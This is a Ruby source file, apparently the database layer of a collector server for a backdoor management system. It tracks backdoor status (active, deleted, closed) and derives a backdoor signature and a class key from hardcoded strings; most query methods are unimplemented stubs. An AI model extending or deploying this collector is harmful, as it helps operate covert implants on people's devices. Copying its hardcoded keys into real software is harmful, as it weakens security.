#
#  The DB abstraction layer
#

# relatives
require_relative 'config.rb'

# from RCS::Common
require 'rcs-common/trace'

# system
require 'digest/md5'
require 'singleton'

module RCS
module Collector

class DB
  include Singleton
  include RCS::Tracer

  ACTIVE_BACKDOOR = 0
  DELETED_BACKDOOR = 1
  CLOSED_BACKDOOR = 2
  NO_SUCH_BACKDOOR = 3
  
  attr_reader :backdoor_signature

  def initialize
    @db_host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s
    @db_avail = false
  end

  def cache_init
    trace :info, "Initializing the DB cache..."
    #TODO: empty the cache and populate it again
    @backdoor_signature = Digest::MD5.digest '4yeN5zu0+il3Jtcb5a1sBcAdjYFcsD9z'
  end

  def check_conn
    trace :info, "Checking the DB connection [#{@db_host}]..."
    #TODO: check the connection
    #trace :error, "Database is down"
    @db_avail = true
  end

  def connected?
    #TODO: is the database available ?
    return @db_avail
  end

  def class_key_of(build_id)
    #TODO: real query
    return Digest::MD5.digest '-HcIbnSmrnaXFk6peeZJMx8HFcJPg9Hx'
  end

  def status_of(build_id, instance_id, subtype)
    #TODO: real query
    return ACTIVE_BACKDOOR, 0
  end

  def sync_for(bid, version, user, device, source, time)
    #TODO: implement
  end

end #DB

end #Collector::
end #RCS::